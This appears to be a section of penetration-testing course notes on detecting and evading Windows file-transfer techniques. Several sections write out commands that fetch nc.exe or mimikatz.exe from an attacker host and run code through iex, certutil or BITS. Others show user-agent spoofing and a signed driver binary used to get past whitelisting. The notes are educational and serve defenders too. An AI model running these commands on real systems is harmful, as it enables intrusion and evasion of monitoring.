## 1. Introduction

Every file transfer technique covered so far leaves some kind of trace — a process that ran, a network connection that was made, a specific pattern of bytes sent across the wire. This section looks at both sides of that coin: how defenders can spot these traces, and how attackers try to blend in despite them. Understanding both halves matters regardless of which side of the table you're sitting on — a defender who doesn't think like an attacker will miss obvious gaps, and an attacker who doesn't think like a defender will get caught by things that seemed insignificant.

**Machine labels used in this section:**

| Label | Role |
|---|---|
| **FOOT_HOLD** | The compromised/target machine where a transfer technique is executed |
| **HACKER** (a.k.a. Pwnbox) | The attack machine, hosting files or listening for connections |

## 2. Detection Approaches

### 2.1 Command-Line Blacklisting vs. Whitelisting

Two fundamentally different philosophies exist for flagging suspicious command-line activity:

| Approach | How it works | Strength | Weakness |
|---|---|---|---|
| **Blacklisting** | Flag specific known-bad command strings or patterns | Fast to set up | Trivially bypassed — even something as simple as changing letter case (`CeRtUtIl` instead of `certutil`) can slip past a naive string match |
| **Whitelisting** | Define every command line considered "normal" for a given environment; flag anything that doesn't match | Very robust, catches unknown/novel techniques too | Time-consuming to build initially, since it requires understanding what "normal" actually looks like across an entire environment |

The trade-off here is a classic security pattern: blacklisting is quick to deploy but easy to slip past, while whitelisting takes real up-front investment but offers much stronger, longer-lasting protection — including against techniques nobody has specifically blacklisted yet.

### 2.2 What Is a User Agent, and Why Does It Matter?

Most client-server protocols — HTTP especially — require the two sides to agree on how content will be formatted and delivered before any real data changes hands. Part of that negotiation involves the client identifying itself to the server using a **user agent string**: a short piece of text describing what software is making the request (Firefox, Chrome, a particular version of curl, and so on).

This exists for legitimate interoperability reasons — web servers sometimes need to know which browser they're talking to in order to serve content that renders correctly everywhere. But the same identifying information applies to *any* HTTP client, not just browsers: `curl`, a custom Python script, security tools like `sqlmap` or `Nmap`, and — relevantly here — the various built-in Windows tools covered throughout these notes, all send their own distinctive user agent strings.

**How defenders use this:** by building a reference list of known-legitimate user agents — covering default OS processes, standard update services (Windows Update, antivirus updates, etc.) — and feeding that list into a SIEM (Security Information and Event Management) tool used for threat hunting, anything that *doesn't* match the known-good list stands out as worth investigating. This won't catch every malicious transfer, but it's a genuinely effective way to surface anomalies that might otherwise blend into normal traffic.

This [website](https://useragentstring.com/index.php) is handy for identifying common user agent strings.

A list of user agent strings is available [here](https://useragentstring.com/pages/useragentstring.php).

### 2.3 Fingerprints of Common Transfer Techniques

Each of the following was observed (on Windows 10, build 10.0.14393, with PowerShell 5) by capturing the actual HTTP request a given technique sends. Commands shown run **on FOOT_HOLD**; the "Server" blocks show what a listener on **HACKER** would actually see arrive.

**Invoke-WebRequest / Invoke-RestMethod:**
```
PS C:\Users\Public> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\Users\Public> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
As seen by the server:
```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```
*Note the `WindowsPowerShell/5.1.14393.0` fragment — a dead giveaway that PowerShell's own cmdlets made this request, clearly distinguishable from a real browser.*

**WinHttpRequest (COM object):**
```
PS C:\Users\Public> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\Users\Public> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\Users\Public> $h.send();
PS C:\Users\Public> iex $h.ResponseText
```
*This creates a COM object (a reusable software component built into Windows) wrapping the `WinHttpRequest` interface, opens a GET request to the URL, sends it, and pipes the response text straight into `iex` (`Invoke-Expression`) — the same fileless execution pattern covered in earlier sections.*

As seen by the server:
```
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```
*The user agent string explicitly names `WinHttp.WinHttpRequest.5` — about as clear a fingerprint as it gets.*

**Msxml2.XMLHTTP (another COM object):**
```
PS C:\Users\Public> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\Users\Public> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\Users\Public> $h.send();
PS C:\Users\Public> iex $h.responseText
```
As seen by the server:
```
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```
*This one's trickier to spot at a glance — the user agent string claims to be Internet Explorer 7 (`MSIE 7.0`, with the `Trident` rendering engine), which could plausibly be mistaken for an actual legacy browser if not scrutinized carefully.*

**Certutil:**
```
C:\Users\Public> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\Users\Public> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```
As seen by the server:
```
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```
*`Microsoft-CryptoAPI/10.0` is a very distinctive, hard-to-mistake-for-anything-else user agent — a strong, reliable signal that Certutil specifically was used to make this request.*

**BITS:**
```
PS C:\Users\Public> Import-Module bitstransfer;
PS C:\Users\Public> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\Users\Public> $r=gc $env:temp\t;
PS C:\Users\Public> rm $env:temp\t; 
PS C:\Users\Public> iex $r
```
*This downloads the file to a temp path, reads its contents into a variable (`gc` is short for `Get-Content`), deletes the temp file, and runs the content via `iex` — another fileless pattern, this time layered on top of BITS.*

As seen by the server:
```
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```
*`Microsoft BITS/7.8` is similarly distinctive. Note also that this is a `HEAD` request rather than `GET` — BITS often checks file metadata first before actually transferring the full content, which is itself a secondary identifying trait.*

**Summary table of fingerprints:**

| Technique | Distinctive User-Agent (or request trait) |
|---|---|
| Invoke-WebRequest / Invoke-RestMethod | `WindowsPowerShell/5.1.14393.0` |
| WinHttpRequest | `WinHttp.WinHttpRequest.5` |
| Msxml2.XMLHTTP | Claims to be `MSIE 7.0` (Trident engine) |
| Certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8`, plus an initial `HEAD` request |

> **Takeaway for defenders:** this is only a starting point. Building a whitelist of approved binaries (or, as a lighter-weight alternative, a blacklist of binaries specifically known to be abused this way) and actively hunting for unusual or unexpected user agent strings are both genuinely effective ways to catch this category of activity in progress.

## 3. Evading Detection

### 3.1 Changing the User Agent

Since `Invoke-WebRequest`'s default user agent so clearly announces itself as PowerShell, and a diligent defender might specifically blacklist that string, PowerShell provides a built-in `-UserAgent` parameter that lets you substitute a different, more innocuous-looking identity — mimicking Internet Explorer, Firefox, Chrome, Opera, or Safari. If, for example, Chrome is the standard browser used throughout an organization, making a request that claims to be Chrome is far less likely to stand out.

**Listing the available built-in user agent strings, run on FOOT_HOLD:**
```
PS C:\>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```
*`[Microsoft.PowerShell.Commands.PSUserAgent]` is a built-in .NET class that already comes with a handful of pre-defined, realistic user agent strings. `GetProperties()` lists its available properties (one per browser), and the rest of the pipeline formats each one alongside the actual string value it resolves to.*

**Using one of these to make the download request look like Chrome, on FOOT_HOLD:**
```
PS C:\> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
*Storing the Chrome user agent string in a variable first (`$UserAgent`), then passing it via `-UserAgent` to `Invoke-WebRequest`, overrides the default PowerShell-identifying string with the Chrome one instead.*

**Confirming the change actually worked, viewed on HACKER's listener:**
```
$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```
*The incoming request now shows the Chrome-style user agent instead of the default PowerShell one — from the server's point of view, this request looks like it came from an actual Chrome browser rather than a scripted download, at least based on this one header alone.*

> **Important limitation:** changing the user agent string only disguises *that one signal*. A sufficiently thorough defender might still notice other tells — for example, an ordinary user's browser wouldn't typically be making a raw `GET` request for an executable file with no supporting page load, cookies, or referrer around it. User agent spoofing raises the bar, but it isn't a complete disguise on its own.

### 3.2 Using LOLBins to Dodge Application Whitelisting

Sometimes the obstacle isn't detection of a specific technique's network fingerprint — it's that an environment's **application whitelisting** policy simply won't allow PowerShell or Netcat to run at all, and **command-line logging** might alert defenders the moment either one is attempted, regardless of what request it ultimately makes.

In that situation, the answer is to lean further into the "living off the land" idea covered in the previous section's LOLBAS/GTFOBins material — specifically seeking out a binary that's both (a) permitted by the whitelist and (b) unlikely to be specifically monitored or alerted on, precisely because it's obscure enough that defenders haven't thought to watch it.

**Example: the Intel Graphics Driver's GfxDownloadWrapper.exe.** This is a legitimate component that ships with some systems' Intel graphics drivers, and its normal job is periodically downloading configuration files. Because it's a driver-support utility rather than an obviously "attacker" tool, it may slip past both application whitelisting (since it's a legitimate, signed driver component) and alerting rules (since nobody expects a graphics driver helper to be involved in anything suspicious).

```
PS C:\> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
*The first argument is the URL to download from (hosted on HACKER), and the second is the local destination path to save it to — functioning essentially as a disguised, driver-branded file downloader.*

**The broader principle here matters more than this one specific binary.** `GfxDownloadWrapper.exe` happens to exist on *some* systems, but it won't be present everywhere. The real skill is knowing to check the LOLBAS project for whatever binaries actually exist in a *given* target environment and picking whichever one both functions as needed and is least likely to be specifically flagged. The same logic applies on Linux via GTFOBins, which — at the time the underlying material was written — already documented close to 40 commonly installed binaries capable of performing file transfers.

## 6. Big-Picture Takeaways

1. **Whitelisting beats blacklisting for durability, not convenience.** Blacklists are quick to set up but trivially defeated (even by something as simple as changing letter case); whitelists take real up-front effort but remain effective against techniques nobody has specifically catalogued yet.
2. **User agent strings are an underappreciated detection signal.** Nearly every built-in Windows download technique — PowerShell cmdlets, COM-based HTTP objects, Certutil, BITS — leaves behind a distinctive, identifiable user agent, even when the underlying request otherwise looks unremarkable.
3. **Evasion and detection are a continuous back-and-forth, not a one-time fix.** Spoofing a user agent defeats a defense built around user agent strings specifically — but a defender who also considers *other* traits (request patterns, timing, destination, file type) can still catch the same activity.
4. **LOLBins solve a different problem than user-agent spoofing.** Changing a user agent helps when the HTTP request itself is being scrutinized; finding a whitelisted LOLBin helps when the problem is that a whole *category* of tool (PowerShell, Netcat) is blocked outright, regardless of what request it would make.
5. **Obscurity has a shelf life.** A LOLBin's usefulness often depends on defenders not yet knowing to watch for it — which is exactly why resources like LOLBAS and GTFOBins, despite being public and widely known, still work: the sheer number of possible binaries (nearly 40 cataloged for Linux alone, at the time this material was written) makes it impractical for most environments to specifically monitor every single one.
6. **No single evasion technique is a complete disguise.** Both user agent spoofing and LOLBin substitution only address one specific detection signal each — a thorough defender who layers multiple detection methods together (command-line whitelisting, user agent anomaly hunting, and behavioral monitoring) makes any single evasion trick far less sufficient on its own.
